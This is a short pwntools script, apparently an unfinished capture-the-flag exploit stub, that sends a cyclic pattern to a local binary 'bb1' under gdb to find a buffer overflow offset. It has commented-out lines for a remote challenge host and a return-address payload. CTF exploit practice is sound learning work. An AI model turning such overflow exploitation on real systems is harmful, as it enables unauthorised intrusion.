import pwn

p = pwn.gdb.debug("./bb1", aslr=False)

#p = remote('host1.metaproblems.com',5151)

#payload = 
p.write(pwn.cyclic(2000, n=8) + b"\n")
#payload += p64(0x401172) + 


#p.sendline(payload)
p.interactive()
#response = p.readline()
#if (response != "Invalid auth.\n"):
#	print(offset)
#	print(response)

